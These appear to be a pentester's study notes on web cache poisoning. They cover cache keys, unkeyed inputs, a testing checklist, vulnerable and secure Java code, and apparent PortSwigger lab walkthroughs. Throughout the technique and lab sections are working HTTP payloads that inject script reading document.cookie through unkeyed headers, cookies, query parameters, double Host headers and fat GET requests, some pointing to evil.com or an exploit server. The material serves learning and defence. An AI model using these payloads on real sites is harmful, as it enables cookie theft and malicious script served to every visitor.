tactic: Defense Evasion


**Web Cache Poisoning** is when an attacker manipulates a cached HTTP response so that malicious content gets served to other users who request the same resource. The attacker poisons once, the cache delivers the payload to every victim that hits that page.

```
Normal flow: User A requests /home → Cache miss → Backend responds → Cache stores response → User A gets response User B requests /home → Cache hit → Cache serves stored response → User B gets response Poisoned 

flow: Attacker sends /home with X-Forwarded-Host: evil.com → Backend reflects evil.com in response Cache stores the poisoned response Every user requesting /home gets served the poisoned response with evil.com content
```

**Cache Key** is what the cache uses to match requests. Typically includes the request line (method + path) and the Host header. Any input NOT in the cache key is called an **unkeyed input**, and that is where poisoning happens.

## Injection Points

- Unkeyed headers: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`
- Unkeyed cookies reflected in the response body
- Unkeyed query parameters reflected in the response (`utm_content`, `utm_source`, analytics params)
- Fat GET requests (body params ignored by cache but processed by backend)
- Double `Host` headers
- URL path normalization quirks

---

## Checklist

### Step 1, Find a Cache Oracle

- [ ]  Look for an explicit cache indicator in response headers:

```
	X-Cache: hit
	X-Cache: miss
	CF-Cache-Status: HIT
	Age: 30
```

- [ ]  Check for Akamai, add this header to reveal cache key:

```
	Pragma: akamai-x-get-cache-key
```

- [ ]  If no explicit indicator, look for observable change in dynamic content or distinct response time differences between cached and uncached responses

### Step 2, Add a Cache Buster

- [ ]  Always add a unique cache buster to avoid poisoning yourself or real users while testing:

```
	GET /page?cb=12345
	X-Cache-Buster: test123
```

- [ ]  Use Param Miner, enable "Add static/dynamic cache buster" and "Include cache busters in headers"

### Step 3, Find Unkeyed Inputs

- [ ]  Run Param Miner on the target, select "Guess headers" to discover unkeyed headers
- [ ]  Manually test headers and check if value is reflected in the response:

```
	X-Forwarded-Host: canary123
	X-Host: canary123
	X-Forwarded-Server: canary123
```

- [ ]  Check the `Vary` header in the response, it lists additional headers treated as part of the cache key:

```
	Vary: User-Agent   ← User-Agent is part of the key, use victim's UA to target them
```

- [ ]  Test unkeyed query params, UTM params are commonly excluded:

```
	?utm_content=canary
	?utm_source=canary
```

### Step 4, Evaluate Impact and Exploit

- [ ]  If unkeyed input is reflected unsanitized, inject XSS:

```
	X-Forwarded-Host: evil.com/"><script>alert(document.cookie)</script>
```

- [ ]  Point to exploit server to serve malicious JS:

```
	X-Forwarded-Host: exploit-server.net
```

```
Then serve `alert(document.cookie)` from your exploit server and let the cache store the response
```

---

## Attack Techniques

### Unkeyed Header Poisoning


```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: exploit-server.net
```

If `exploit-server.net` is reflected in the response and gets cached, every visitor gets content loaded from your server.

### Unkeyed Cookie Poisoning

```
Cookie: session=abc; fehost="-alert(1)}//
```

Toggle with a cache buster first to confirm, then remove the buster and let it cache.

### Multiple Header Poisoning

```http
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-server.net
```

Combining both can trigger a redirect to your server which gets cached.

### Double Host Header

```http
Host: target.com
Host: "></script><script>alert(document.cookie)</script>
```

Some caches key on the first Host, some backends use the second.

### Unkeyed Query String

```
GET /?a='/><script>alert(1)</script>
```

If the query string is unkeyed and reflected, inject XSS directly. Use `Origin` header as a cache buster.

### Unkeyed UTM Parameter

```
GET /?utm_content='/><script>alert(1)</script>
```

UTM params are often stripped from the cache key but still processed by the backend.

### Parameter Cloaking

Some parsers treat `?` differently, use `;` to inject a second parameter that overrides the first:

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

Cache sees `callback=setCountryCookie`, backend sees `callback=alert(1)`.

### Fat GET Request

Cache keys on the URL, backend reads from the body:

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1

callback=alert(1)
```

If that fails, try overriding the method:

```
X-HTTP-Method-Override: POST
```

### URL Normalization

If 404 pages reflect the path unsanitized:

```
GET /random</p><script>alert(1)</script>
```

The cache stores this poisoned 404 and serves it to anyone hitting that path.

### Targeted Poisoning via Vary Header

If the response contains `Vary: User-Agent`, the cache keys on User-Agent. To target a specific victim:

1. Lure the victim to your page with `<img src="https://target.com/page">`
2. Check your exploit server logs for their User-Agent
3. Replay the poisoning request with their exact User-Agent

---

## White Box Testing

**Vulnerable, unkeyed header reflected directly into response without sanitization:**


```java
@GetMapping("/")
public String home(HttpServletRequest request, Model model) {
    // backend reads X-Forwarded-Host and uses it to build URLs in the page
    String host = request.getHeader("X-Forwarded-Host");
    if (host == null) {
        host = request.getHeader("Host");
    }
    // reflected into og:image, script src, or canonical URLs
    model.addAttribute("cdnHost", host);
    return "home"; // template uses cdnHost to build resource URLs
}
```

**Vulnerable, cache config does not include important headers in the cache key:**

```java
// Spring + Caffeine cache, caches on path only
@Cacheable(value = "pages", key = "#request.requestURI")
@GetMapping("/**")
public ResponseEntity<String> servePage(HttpServletRequest request) {
    // X-Forwarded-Host affects the response but is not part of the cache key
    String host = request.getHeader("X-Forwarded-Host");
    return ResponseEntity.ok(buildPage(host));
}
```

**Vulnerable, cookie value reflected in response and not part of cache key:**


```java
@GetMapping("/home")
@Cacheable("home")
public String home(@CookieValue(defaultValue = "default") String fehost, Model model) {
    // fehost cookie is reflected in the response body for feature host config
    model.addAttribute("feHost", fehost); // attacker injects XSS via cookie value
    return "home";
}
```

**Secure:**


```java
// Never use unkeyed inputs to build URLs or reflect content
// If X-Forwarded-Host is needed, validate against a whitelist
@Value("${app.allowed-hosts}")
private List<String> allowedHosts;

private String resolveHost(HttpServletRequest request) {
    String forwarded = request.getHeader("X-Forwarded-Host");
    if (forwarded != null && allowedHosts.contains(forwarded)) {
        return forwarded;
    }
    return request.getServerName(); // fall back to the actual server name
}

// Include all response-affecting headers in the cache key
@Cacheable(value = "pages", key = "#request.requestURI + #request.getHeader('Accept-Language')")
public ResponseEntity<String> servePage(HttpServletRequest request) { ... }

// Set proper Cache-Control to prevent caching of personalised or sensitive responses
response.setHeader("Cache-Control", "no-store, private");
```

---



## LABS

 **Web cache poisoning with an unkeyed header**

i noticed that in the page `/` if i added `X-Forwarded-Host: example` it gets reflected in the  response , i tried to do an xss noluck

so what we can do is that  add the header 
```

X-Forwarded-Host: exploit-0a2800b6047a4d3c801193a101990064.exploit-server.net/
```

 to the exploit server and serve a `alert(doc.cookie)` in the body 

![[Pasted image 20260224123238.png]]
 **Web cache poisoning with an unkeyed cookie**

``` js
; fehost="-alert(1)}//
```

toggle the payload with a specifier like `/login?a=a` to be certain  then visit the page 

 **Web cache poisoning with multiple headers**
```http
X-Forwarded-Scheme: HTTP
X-Forwarded-Host: exploit-0a390002037cb91b80a7395f017300dd.exploit-server.net
```
add these in the header then visit the app 

 **Double Host / Cache poisoning**

```
Host: 0adf00cc033d5f09c05b077d000200eb.web-security-academy.net
Host: "></script><script>alert(document.cookie)</script>
```
 **Targeted web cache poisoning using an unknown header**

-  check for leaking info in `Vary` header

i noticed that basically with param miner we get some secret header which is X-host and this header acted upon building a a full url in the response so we placed that X-host  in our expoit server and in the body we inserted a alert()

i noticed that the response cotains vary header user agent The `Vary` header specifies a list of additional headers that should be treated as part of the cache key even if they are normally unkeyed

meaning it can be used as cache distinguisher  pace this the expoit server in the post as `<img src="...">` and check  the logs copy the victims user agent and we are done 


 **Web cache poisoning via an unkeyed query string**

origin header is basiaclly the cache buster 

we noticed when we placed a query string its reflected hence we can do is that reflected xss 

```js
`/?a='/><script>alert(1)</script> `

```

**Web cache poisoning via an unkeyed query parameter**

the application accepts utm_content  which is a utacking module  basically the value is reflected in it

```javascript

GET /?utm_content='/><script>alert(1)</script
```

 **Parameter cloaking**

``` HTTP
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1) 
```


or we can basically rewrite callback 

 **Web cache poisoning via a fat GET request**


`GET /?param=innocent HTTP/1.1 … param=bad-stuff-here`

if this didn't work try adding ``X-HTTP-Method-Override: POST`` 


``` http 
GET /js/geolocate.js?callback=setCountryCookie
callback=alert(1) 
```

 **URL normalization**

anything we write in the  home page result in not found and the value is reflected  

``` HTTP 
GET /a</p><script>alert(1)</script> 
```


**Web cache poisoning via ambiguous requests**

Add a host header `Host: exploit-0a8c007803a6cd7a8075f81f01b700ce.exploit-server.net` to the exploit server and in the body insert an alert(cookie.document)
# References

- https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
- https://www.youtube.com/watch?v=r2NWdLvb_lE&list=PLGb2cDlBWRUUvoGqcCF1xe86AaRXGSMT5